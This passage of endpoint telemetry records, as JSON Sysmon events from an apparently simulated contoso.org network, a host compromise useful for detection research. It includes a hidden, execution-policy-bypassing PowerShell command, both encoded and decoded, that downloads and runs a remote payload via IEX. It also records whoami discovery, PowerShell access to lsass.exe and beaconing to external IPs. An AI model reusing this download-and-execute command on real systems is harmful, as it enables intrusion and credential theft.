        {
            "action": "start",
            "count": 36,
            "dest_fqdn": "srv-dc-11.contoso.org",
            "dest_hostname": "srv-dc-11",
            "dest_ip": "10.0.0.7",
            "dest_ipv6": "false",
            "dest_port": 135,
            "event_id": "4c3b9be4aed5926af8a79ca1bc6a21b268d041b2ab607f375ad8614c30869f69",
            "event_type": "flow",
            "event_utc": "2020-09-29T15:33:56.614Z",
            "exe": "lsass.exe",
            "fqdn": "cmp-535872.contoso.org",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "4c3b9be4aed5926af8a79ca1bc6a21b268d041b2ab607f375ad8614c30869f69",
            "image_path": "C:\\Windows\\System32\\lsass.exe",
            "initiated": true,
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "flow",
            "pid": 788,
            "process_guid": "{DD483508-D8C0-5F6C-0000-001017C10000}",
            "record_number": "4177996",
            "src_fqdn": "cmp-535872.contoso.org",
            "src_hostname": "cmp-535872",
            "src_ip": "10.0.0.0",
            "src_ipv6": "false",
            "src_port": 53860,
            "subtype": "start",
            "time": "2020-09-29T15:33:42.387Z",
            "timestamp": 1601393622387,
            "transport": "tcp",
            "user": "NT AUTHORITY\\SYSTEM",
            "uuid": "{DD483508-D8C0-5F6C-0000-001017C10000}"
        },
        {
            "action": "create",
            "command_line": "powershell -exec bypass -Noninteractive -windowstyle hidden -e WwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQATQBhAG4AYQBnAGUAcgBdADoAOgBTAGUAcgB2AGUAcgBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAVgBhAGwAaQBkAGEAdABpAG8AbgBDAGEAbABsAGIAYQBjAGsAIAA9ACAAewAkAHQAcgB1AGUAfQA7ACQATQBTAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBTAHkAcwB0AGUAbQAuAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAHMAeQBzAHQAZQBtAC4AbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAHMAdAByAGkAbgBnACgAJwBoAHQAdABwAHMAOgAvAC8AMQAwAC4AMAAuADAALgA4ADoANAA0ADMALwBiAHUAcwBpAG4AZQBzAHMALwByAGUAdABhAGkAbAAtAGIAdQBzAGkAbgBlAHMAcwAvAF8AcgBwACcAKQApACkAOwBJAEUAWAAgACQATQBTAA==",
            "decoded_command_line": "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};$MS=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((new-object system.net.webclient).downloadstring('https://10.0.0.8:443/business/retail-business/_rp')));IEX $MS",
            "event_id": "18622ecd91d3190a45fa771764b73c3cec534520878476d51e5806e041ba862c",
            "event_type": "process",
            "event_utc": "2020-09-29T15:49:46.225Z",
            "exe": "powershell.exe",
            "fqdn": "cmp-535872.contoso.org",
            "hash": {
                "MD5": "FF59EF73460173ABDB10EDE1A0BC9CE6",
                "SHA256": "34507738F84B9D4F231DC0C187FEE4A03B4DDB84CF63FF56A4A1761A9BD56EA6"
            },
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "18622ecd91d3190a45fa771764b73c3cec534520878476d51e5806e041ba862c",
            "image_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "integrity_level": "High",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "logon_guid": "{E0425724-A193-46EB-8062-B64C378337CC}",
            "logon_id": "0xf28ca3",
            "nodetype": "event",
            "object": "process",
            "original_file_name": "PowerShell.EXE",
            "parent_command_line": "C:/Users/mcasey/AppData/Roaming/Microsoft/ms_info.exe /RegServer",
            "parent_exe": "ms_info.exe",
            "parent_image_path": "C:\\Users\\mcasey\\AppData\\Roaming\\Microsoft\\ms_info.exe",
            "parent_process_guid": "{DD483508-4E92-5F73-0000-0010783FED0B}",
            "pid": 10944,
            "ppid": 5212,
            "process_guid": "{DD483508-579A-5F73-0000-0010C692AC0C}",
            "record_number": "4178169",
            "subtype": "create",
            "terminal_session_id": "1",
            "time": "2020-09-29T15:49:46.227Z",
            "timestamp": 1601394586227,
            "user": "CONTOSO\\MCASEY",
            "uuid": "{DD483508-579A-5F73-0000-0010C692AC0C}"
        },
        {
            "action": "create",
            "creation_time": "2020-09-29 15:49:46.590",
            "event_id": "aa065a0fbf45f680396a062bdebaf91da8365d8e16ad022e9d4ddc690afabefb",
            "event_type": "file",
            "event_utc": "2020-09-29T15:49:46.590Z",
            "exe": "powershell.exe",
            "file_name": "__PSScriptPolicyTest_qdh4tt0m.boa.ps1",
            "file_path": "C:\\Users\\mcasey\\AppData\\Local\\Temp\\__PSScriptPolicyTest_qdh4tt0m.boa.ps1",
            "fqdn": "cmp-535872.contoso.org",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "aa065a0fbf45f680396a062bdebaf91da8365d8e16ad022e9d4ddc690afabefb",
            "image_path": "C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "file",
            "pid": 10944,
            "process_guid": "{DD483508-579A-5F73-0000-0010C692AC0C}",
            "record_number": "4178170",
            "subtype": "create",
            "time": "2020-09-29T15:49:46.620Z",
            "timestamp": 1601394586620,
            "uuid": "{DD483508-579A-5F73-0000-0010C692AC0C}"
        },
        {
            "action": "start",
            "count": 1589,
            "dest_fqdn": "srv-sft-update-38.contoso.org",
            "dest_hostname": "srv-sft-update-38",
            "dest_ip": "10.0.0.8",
            "dest_ipv6": "false",
            "dest_port": 443,
            "event_id": "e0f3439e2740745e532321e9b6a020ec0239529ab85a96abbe70ee2a18c63005",
            "event_type": "flow",
            "event_utc": "2020-09-29T15:52:42.182Z",
            "exe": "powershell.exe",
            "fqdn": "cmp-535872.contoso.org",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "e0f3439e2740745e532321e9b6a020ec0239529ab85a96abbe70ee2a18c63005",
            "image_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "initiated": true,
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "flow",
            "pid": 10944,
            "process_guid": "{DD483508-579A-5F73-0000-0010C692AC0C}",
            "record_number": "4178214",
            "src_fqdn": "cmp-535872.contoso.org",
            "src_hostname": "cmp-535872",
            "src_ip": "10.0.0.0",
            "src_ipv6": "false",
            "src_port": 54023,
            "subtype": "start",
            "time": "2020-09-29T15:52:28.030Z",
            "timestamp": 1601394748030,
            "transport": "tcp",
            "user": "CONTOSO\\MCASEY",
            "uuid": "{DD483508-579A-5F73-0000-0010C692AC0C}"
        },
        {
            "action": "create",
            "command_line": "\"C:\\windows\\system32\\whoami.exe\" /user",
            "event_id": "3aa618f84d42c45726d7d7b24d9f6dea5b68e3d9d6b0a32683a882855bd705bf",
            "event_type": "process",
            "event_utc": "2020-09-29T15:56:42.110Z",
            "exe": "whoami.exe",
            "fqdn": "cmp-535872.contoso.org",
            "hash": {
                "MD5": "5DD9FA8EFACBD27584AEEC8EF4307EFE",
                "SHA256": "6C7C2450A80F401B8D3B33754C45D91D60D4A2055533542389551C0C609261D2"
            },
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "3aa618f84d42c45726d7d7b24d9f6dea5b68e3d9d6b0a32683a882855bd705bf",
            "image_path": "C:\\Windows\\System32\\whoami.exe",
            "integrity_level": "High",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "logon_guid": "{E0425724-A193-46EB-8062-B64C378337CC}",
            "logon_id": "0xf28ca3",
            "nodetype": "event",
            "object": "process",
            "original_file_name": "whoami.exe",
            "parent_command_line": "powershell -exec bypass -Noninteractive -windowstyle hidden -e WwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQATQBhAG4AYQBnAGUAcgBdADoAOgBTAGUAcgB2AGUAcgBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAVgBhAGwAaQBkAGEAdABpAG8AbgBDAGEAbABsAGIAYQBjAGsAIAA9ACAAewAkAHQAcgB1AGUAfQA7ACQATQBTAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBTAHkAcwB0AGUAbQAuAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAHMAeQBzAHQAZQBtAC4AbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAHMAdAByAGkAbgBnACgAJwBoAHQAdABwAHMAOgAvAC8AMQAwAC4AMAAuADAALgA4ADoANAA0ADMALwBiAHUAcwBpAG4AZQBzAHMALwByAGUAdABhAGkAbAAtAGIAdQBzAGkAbgBlAHMAcwAvAF8AcgBwACcAKQApACkAOwBJAEUAWAAgACQATQBTAA==",
            "parent_exe": "powershell.exe",
            "parent_image_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "parent_process_guid": "{DD483508-579A-5F73-0000-0010C692AC0C}",
            "pid": 6668,
            "ppid": 10944,
            "process_guid": "{DD483508-593A-5F73-0000-0010D264B60C}",
            "record_number": "4178294",
            "subtype": "create",
            "terminal_session_id": "1",
            "time": "2020-09-29T15:56:42.113Z",
            "timestamp": 1601395002113,
            "user": "CONTOSO\\MCASEY",
            "uuid": "{DD483508-593A-5F73-0000-0010D264B60C}"
        },
        {
            "action": "access",
            "call_trace": "C:\\windows\\SYSTEM32\\ntdll.dll+a18c4|C:\\windows\\System32\\KERNELBASE.dll+1075a|C:\\windows\\System32\\KERNELBASE.dll+d846|C:\\windows\\System32\\KERNEL32.DLL+1c6e3|C:\\windows\\assembly\\NativeImages_v4.0.30319_64\\System\\78b8fb2c58a4cdcc3a44547b9bbd80b9\\System.ni.dll+3332f6|C:\\windows\\assembly\\NativeImages_v4.0.30319_64\\System\\78b8fb2c58a4cdcc3a44547b9bbd80b9\\System.ni.dll+2b5560|C:\\windows\\assembly\\NativeImages_v4.0.30319_64\\System\\78b8fb2c58a4cdcc3a44547b9bbd80b9\\System.ni.dll+2b4f07|UNKNOWN(00007FFF77D8F6CB)|UNKNOWN(00007FFF77CE9A9D)|UNKNOWN(00007FFF77D6C4FE)|UNKNOWN(00007FFF77D6C1DB)|UNKNOWN(00007FFF77E5F6C4)|UNKNOWN(00007FFF38BF1A11)",
            "event_id": "85d29236aa2f3ba6b770dd9bf2a25e7a69cb4f5e94918bbffe90eab56b543fb2",
            "event_type": "process",
            "event_utc": "2020-09-29T15:56:42.112Z",
            "exe": "whoami.exe",
            "fqdn": "cmp-535872.contoso.org",
            "granted_access": "0x1fffff",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "85d29236aa2f3ba6b770dd9bf2a25e7a69cb4f5e94918bbffe90eab56b543fb2",
            "image_path": "C:\\windows\\system32\\whoami.exe",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "process",
            "pid": 6668,
            "process_guid": "{DD483508-593A-5F73-0000-0010D264B60C}",
            "record_number": "4178295",
            "src_exe": "powershell.exe",
            "src_image_path": "C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "src_pid": "10944",
            "src_process_guid": "{DD483508-579A-5F73-0000-0010C692AC0C}",
            "subtype": "access",
            "time": "2020-09-29T15:56:42.113Z",
            "timestamp": 1601395002113,
            "uuid": "{DD483508-593A-5F73-0000-0010D264B60C}"
        },
        {
            "action": "access",
            "call_trace": "C:\\windows\\SYSTEM32\\ntdll.dll+a0574|C:\\windows\\System32\\KERNELBASE.dll+3dd5d|UNKNOWN(000001D91A6B4FC3)",
            "event_id": "2ee7c612e85188546cbf24b655d0ed8b4fb7a60c62fd879d3c658f8c19ad005e",
            "event_type": "process",
            "event_utc": "2020-09-29T15:56:46.206Z",
            "exe": "lsass.exe",
            "fqdn": "cmp-535872.contoso.org",
            "granted_access": "0x1010",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "2ee7c612e85188546cbf24b655d0ed8b4fb7a60c62fd879d3c658f8c19ad005e",
            "image_path": "C:\\windows\\system32\\lsass.exe",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "process",
            "pid": 788,
            "process_guid": "{DD483508-D8C0-5F6C-0000-001017C10000}",
            "record_number": "4178297",
            "src_exe": "powershell.exe",
            "src_image_path": "C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "src_pid": "10944",
            "src_process_guid": "{DD483508-579A-5F73-0000-0010C692AC0C}",
            "subtype": "access",
            "time": "2020-09-29T15:56:46.212Z",
            "timestamp": 1601395006212,
            "uuid": "{DD483508-D8C0-5F6C-0000-001017C10000}"
        },
        {
            "action": "create",
            "creation_time": "2019-02-19 00:26:54.882",
            "event_id": "a16dc36fc0175c89e1fc2385774b071cc597f2f3c6eb4a8cc6201b8f508fcdbc",
            "event_type": "file",
            "event_utc": "2020-09-29T15:57:01.909Z",
            "exe": "lsass.exe",
            "file_name": "netlogon.ftl",
            "file_path": "C:\\Windows\\System32\\config\\netlogon.ftl",
            "fqdn": "cmp-535872.contoso.org",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "a16dc36fc0175c89e1fc2385774b071cc597f2f3c6eb4a8cc6201b8f508fcdbc",
            "image_path": "C:\\windows\\system32\\lsass.exe",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "file",
            "pid": 788,
            "process_guid": "{DD483508-D8C0-5F6C-0000-001017C10000}",
            "record_number": "4178302",
            "subtype": "create",
            "time": "2020-09-29T15:57:01.918Z",
            "timestamp": 1601395021918,
            "uuid": "{DD483508-D8C0-5F6C-0000-001017C10000}"
        },
        {
            "action": "create",
            "creation_time": "2019-02-19 00:26:54.882",
            "event_id": "2c931acbabd8449a635eebf9f2763666f61ecd1132d41eced5b9b593fbe1ea07",
            "event_type": "file",
            "event_utc": "2020-09-29T16:28:02.076Z",
            "exe": "lsass.exe",
            "file_name": "netlogon.ftl",
            "file_path": "C:\\Windows\\System32\\config\\netlogon.ftl",
            "fqdn": "cmp-535872.contoso.org",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "2c931acbabd8449a635eebf9f2763666f61ecd1132d41eced5b9b593fbe1ea07",
            "image_path": "C:\\windows\\system32\\lsass.exe",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "file",
            "pid": 788,
            "process_guid": "{DD483508-D8C0-5F6C-0000-001017C10000}",
            "record_number": "4178971",
            "subtype": "create",
            "time": "2020-09-29T16:28:02.079Z",
            "timestamp": 1601396882079,
            "uuid": "{DD483508-D8C0-5F6C-0000-001017C10000}"
        },
        {
            "action": "start",
            "count": 15,
            "dest_fqdn": "cmp-447931.contoso.org",
            "dest_hostname": "cmp-447931",
            "dest_ip": "10.0.0.10",
            "dest_ipv6": "false",
            "dest_port": 5000,
            "event_id": "ab0fcc8688fab1d79bb7a5336c6a9048c3c1f0cae652872d940a9f2320c674d6",
            "event_type": "flow",
            "event_utc": "2020-09-29T16:33:14.400Z",
            "exe": "powershell.exe",
            "fqdn": "cmp-535872.contoso.org",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "ab0fcc8688fab1d79bb7a5336c6a9048c3c1f0cae652872d940a9f2320c674d6",
            "image_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "initiated": true,
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "flow",
            "pid": 10944,
            "process_guid": "{DD483508-579A-5F73-0000-0010C692AC0C}",
            "record_number": "4179111",
            "src_fqdn": "cmp-535872.contoso.org",
            "src_hostname": "cmp-535872",
            "src_ip": "10.0.0.0",
            "src_ipv6": "false",
            "src_port": 54865,
            "subtype": "start",
            "time": "2020-09-29T16:32:59.452Z",
            "timestamp": 1601397179452,
            "transport": "tcp",
            "user": "CONTOSO\\MCASEY",
            "uuid": "{DD483508-579A-5F73-0000-0010C692AC0C}"
        },
        {
            "action": "start",
            "count": 2,
            "dest_fqdn": "vm-198-51-100-1.cn-northwest-1.compute.example.com",
            "dest_hostname": "vm-198-51-100-1",
            "dest_ip": "198.51.100.1",
            "dest_ipv6": "false",
            "dest_port": 443,
            "event_id": "5196fb14b5399a3e75448c61cdc105696e123dbfd14e990cee51c2476019b112",
            "event_type": "flow",
            "event_utc": "2020-09-29T16:33:14.569Z",
            "exe": "powershell.exe",
            "fqdn": "cmp-535872.contoso.org",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "5196fb14b5399a3e75448c61cdc105696e123dbfd14e990cee51c2476019b112",
            "image_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "initiated": true,
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "flow",
            "pid": 10944,
            "process_guid": "{DD483508-579A-5F73-0000-0010C692AC0C}",
            "record_number": "4179117",
            "src_fqdn": "cmp-535872.contoso.org",
            "src_hostname": "cmp-535872",
            "src_ip": "10.0.0.0",
            "src_ipv6": "false",
            "src_port": 54871,
            "subtype": "start",
            "time": "2020-09-29T16:32:59.453Z",
            "timestamp": 1601397179453,
            "transport": "tcp",
            "user": "CONTOSO\\MCASEY",
            "uuid": "{DD483508-579A-5F73-0000-0010C692AC0C}"
        },
        {
            "action": "start",
            "count": 2,
            "dest_ip": "104.17.79.107",
            "dest_ipv6": "false",
            "dest_port": 443,
            "event_id": "d58f37e8c70fddbe2c3bb023fa6fb9a4f6b5c02b0313db4b1194a3bfdb3dd63c",
            "event_type": "flow",
            "event_utc": "2020-09-29T16:33:14.625Z",
            "exe": "powershell.exe",
            "fqdn": "cmp-535872.contoso.org",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "d58f37e8c70fddbe2c3bb023fa6fb9a4f6b5c02b0313db4b1194a3bfdb3dd63c",
            "image_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "initiated": true,
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "flow",
            "pid": 10944,
            "process_guid": "{DD483508-579A-5F73-0000-0010C692AC0C}",
            "record_number": "4179121",
            "src_fqdn": "cmp-535872.contoso.org",
            "src_hostname": "cmp-535872",
            "src_ip": "10.0.0.0",
            "src_ipv6": "false",
            "src_port": 54875,
            "subtype": "start",
            "time": "2020-09-29T16:32:59.454Z",
            "timestamp": 1601397179454,
            "transport": "tcp",
            "user": "CONTOSO\\MCASEY",
            "uuid": "{DD483508-579A-5F73-0000-0010C692AC0C}"
        },
        {
            "action": "start",
            "count": 2,
            "dest_fqdn": "vm-198-51-100-2.af-south-1.compute.example.com",
            "dest_hostname": "vm-198-51-100-2",
            "dest_ip": "198.51.100.2",
            "dest_ipv6": "false",
            "dest_port": 443,
            "event_id": "dd1adfbc4bb0e81f9eaa6e84db4955f9f50991137555582f072c5c8763d7d2d8",
            "event_type": "flow",
            "event_utc": "2020-09-29T16:33:14.933Z",
            "exe": "powershell.exe",
            "fqdn": "cmp-535872.contoso.org",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "dd1adfbc4bb0e81f9eaa6e84db4955f9f50991137555582f072c5c8763d7d2d8",
            "image_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "initiated": true,
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "flow",
            "pid": 10944,
            "process_guid": "{DD483508-579A-5F73-0000-0010C692AC0C}",
            "record_number": "4179126",
            "src_fqdn": "cmp-535872.contoso.org",
            "src_hostname": "cmp-535872",
            "src_ip": "10.0.0.0",
            "src_ipv6": "false",
            "src_port": 54880,
            "subtype": "start",
            "time": "2020-09-29T16:32:59.717Z",
            "timestamp": 1601397179717,
            "transport": "tcp",
            "user": "CONTOSO\\MCASEY",
            "uuid": "{DD483508-579A-5F73-0000-0010C692AC0C}"
        },
        {
            "action": "start",
            "count": 3,
            "dest_fqdn": "vm-198-51-100-3.cn-northwest-1.compute.example.com",
            "dest_hostname": "vm-198-51-100-3",
            "dest_ip": "198.51.100.3",
            "dest_ipv6": "false",
            "dest_port": 443,
            "event_id": "5641005f223d59f2f5d6a67128a103f5be6dd90555d95e94275c134279902a23",
            "event_type": "flow",
            "event_utc": "2020-09-29T16:34:24.644Z",
            "exe": "powershell.exe",
            "fqdn": "cmp-535872.contoso.org",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "5641005f223d59f2f5d6a67128a103f5be6dd90555d95e94275c134279902a23",
            "image_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "initiated": true,
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "flow",
            "pid": 10944,
            "process_guid": "{DD483508-579A-5F73-0000-0010C692AC0C}",
            "record_number": "4179230",
            "src_fqdn": "cmp-535872.contoso.org",
            "src_hostname": "cmp-535872",
            "src_ip": "10.0.0.0",
            "src_ipv6": "false",
            "src_port": 54986,
            "subtype": "start",
            "time": "2020-09-29T16:34:10.080Z",
            "timestamp": 1601397250080,
            "transport": "tcp",
            "user": "CONTOSO\\MCASEY",
            "uuid": "{DD483508-579A-5F73-0000-0010C692AC0C}"
        },
        {
            "action": "start",
            "count": 1,
            "dest_fqdn": "vm-198-51-100-4.ap-east-1.compute.example.com",
            "dest_hostname": "vm-198-51-100-4",
            "dest_ip": "198.51.100.4",
            "dest_ipv6": "false",
            "dest_port": 443,
            "event_id": "e8d5aa6fb6673148ef3817bd0355ae9468e70d52bd189e9976b42eb6dab64e1d",
            "event_type": "flow",
            "event_utc": "2020-09-29T16:36:54.968Z",
            "exe": "powershell.exe",
            "fqdn": "cmp-535872.contoso.org",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "e8d5aa6fb6673148ef3817bd0355ae9468e70d52bd189e9976b42eb6dab64e1d",
            "image_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "initiated": true,
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "flow",
            "pid": 10944,
            "process_guid": "{DD483508-579A-5F73-0000-0010C692AC0C}",
            "record_number": "4179388",
            "src_fqdn": "cmp-535872.contoso.org",
            "src_hostname": "cmp-535872",
            "src_ip": "10.0.0.0",
            "src_ipv6": "false",
            "src_port": 55129,
            "subtype": "start",
            "time": "2020-09-29T16:36:40.694Z",
            "timestamp": 1601397400694,
            "transport": "tcp",
            "user": "CONTOSO\\MCASEY",
            "uuid": "{DD483508-579A-5F73-0000-0010C692AC0C}"
        },
        {
            "action": "start",
            "count": 3,
            "dest_ip": "72.21.91.29",
            "dest_ipv6": "false",
            "dest_port": 80,
            "event_id": "72dc934ec802112c315edf81687640d02655ff7abded6514ed2da6f7f7dacb29",
            "event_type": "flow",
            "event_utc": "2020-09-29T16:37:04.549Z",
            "exe": "powershell.exe",
            "fqdn": "cmp-535872.contoso.org",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "72dc934ec802112c315edf81687640d02655ff7abded6514ed2da6f7f7dacb29",
            "image_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "initiated": true,
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "flow",
            "pid": 10944,
            "process_guid": "{DD483508-579A-5F73-0000-0010C692AC0C}",
            "record_number": "4179424",
            "src_fqdn": "cmp-535872.contoso.org",
            "src_hostname": "cmp-535872",
            "src_ip": "10.0.0.0",
            "src_ipv6": "false",
            "src_port": 55156,
            "subtype": "start",
            "time": "2020-09-29T16:36:49.585Z",
            "timestamp": 1601397409585,
            "transport": "tcp",
            "user": "CONTOSO\\MCASEY",
            "uuid": "{DD483508-579A-5F73-0000-0010C692AC0C}"
        },
        {
            "action": "start",
            "count": 7,
            "dest_fqdn": "vm-198-51-100-5.il-central-1.deploy.static.example.com",
            "dest_hostname": "vm-198-51-100-5",
            "dest_ip": "198.51.100.5",
            "dest_ipv6": "false",
            "dest_port": 443,
            "event_id": "4d8a8e3ff9186401db76593a29a156325d5ee16ffdd09efa7ca5533cdd37773f",
            "event_type": "flow",
            "event_utc": "2020-09-29T16:37:15.413Z",
            "exe": "powershell.exe",
            "fqdn": "cmp-535872.contoso.org",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "4d8a8e3ff9186401db76593a29a156325d5ee16ffdd09efa7ca5533cdd37773f",
            "image_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "initiated": true,
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "flow",
            "pid": 10944,
            "process_guid": "{DD483508-579A-5F73-0000-0010C692AC0C}",
            "record_number": "4179442",
            "src_fqdn": "cmp-535872.contoso.org",
            "src_hostname": "cmp-535872",
            "src_ip": "10.0.0.0",
            "src_ipv6": "false",
            "src_port": 55174,
            "subtype": "start",
            "time": "2020-09-29T16:37:00.664Z",
            "timestamp": 1601397420664,
            "transport": "tcp",
            "user": "CONTOSO\\MCASEY",
            "uuid": "{DD483508-579A-5F73-0000-0010C692AC0C}"
        },
        {
            "action": "start",
            "count": 1,
            "dest_fqdn": "vm-198-51-100-6.ap-southeast-4.compute.example.com",
            "dest_hostname": "vm-198-51-100-6",
            "dest_ip": "198.51.100.6",
            "dest_ipv6": "false",
            "dest_port": 443,
            "event_id": "d832c46def18ea13055ef2284f03761c51d80a3d859e694b1b2a5c7f33ffe4ce",
            "event_type": "flow",
            "event_utc": "2020-09-29T16:37:16.394Z",
            "exe": "powershell.exe",
            "fqdn": "cmp-535872.contoso.org",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "d832c46def18ea13055ef2284f03761c51d80a3d859e694b1b2a5c7f33ffe4ce",
            "image_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "initiated": true,
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "flow",
            "pid": 10944,
            "process_guid": "{DD483508-579A-5F73-0000-0010C692AC0C}",
            "record_number": "4179448",
            "src_fqdn": "cmp-535872.contoso.org",
            "src_hostname": "cmp-535872",
            "src_ip": "10.0.0.0",
            "src_ipv6": "false",
            "src_port": 55180,
            "subtype": "start",
            "time": "2020-09-29T16:37:01.664Z",
            "timestamp": 1601397421664,
            "transport": "tcp",
            "user": "CONTOSO\\MCASEY",
            "uuid": "{DD483508-579A-5F73-0000-0010C692AC0C}"
        },
        {
            "action": "start",
            "count": 9,
            "dest_fqdn": "vm-198-51-100-7.ap-southeast-4.usercontent.example.com",
            "dest_hostname": "vm-198-51-100-7",
            "dest_ip": "198.51.100.7",
            "dest_ipv6": "false",
            "dest_port": 443,
            "event_id": "340b181e41a0a466fee44b6f7f88744cf896b6f255695333bc0b57e3047767a0",
            "event_type": "flow",
            "event_utc": "2020-09-29T16:37:49.222Z",
            "exe": "powershell.exe",
            "fqdn": "cmp-535872.contoso.org",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "340b181e41a0a466fee44b6f7f88744cf896b6f255695333bc0b57e3047767a0",
            "image_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "initiated": true,
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "flow",
            "pid": 10944,
            "process_guid": "{DD483508-579A-5F73-0000-0010C692AC0C}",
            "record_number": "4179524",
            "src_fqdn": "cmp-535872.contoso.org",
            "src_hostname": "cmp-535872",
            "src_ip": "10.0.0.0",
            "src_ipv6": "false",
            "src_port": 55256,
            "subtype": "start",
            "time": "2020-09-29T16:37:34.024Z",
            "timestamp": 1601397454024,
            "transport": "tcp",
            "user": "CONTOSO\\MCASEY",
            "uuid": "{DD483508-579A-5F73-0000-0010C692AC0C}"
        },
        {
            "action": "start",
            "count": 1,
            "dest_fqdn": "vm-198-51-100-8.eu-west-3.compute.example.com",
            "dest_hostname": "vm-198-51-100-8",
            "dest_ip": "198.51.100.8",
            "dest_ipv6": "false",
            "dest_port": 443,
            "event_id": "01d4e7be169287bcb1243d65109522e646ac50aab0ff4040cc4dc9f31909bed4",
            "event_type": "flow",
            "event_utc": "2020-09-29T16:38:05.932Z",
            "exe": "powershell.exe",
            "fqdn": "cmp-535872.contoso.org",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "01d4e7be169287bcb1243d65109522e646ac50aab0ff4040cc4dc9f31909bed4",
            "image_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "initiated": true,
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "flow",
            "pid": 10944,
            "process_guid": "{DD483508-579A-5F73-0000-0010C692AC0C}",
            "record_number": "4179567",
            "src_fqdn": "cmp-535872.contoso.org",
            "src_hostname": "cmp-535872",
            "src_ip": "10.0.0.0",
            "src_ipv6": "false",
            "src_port": 55300,
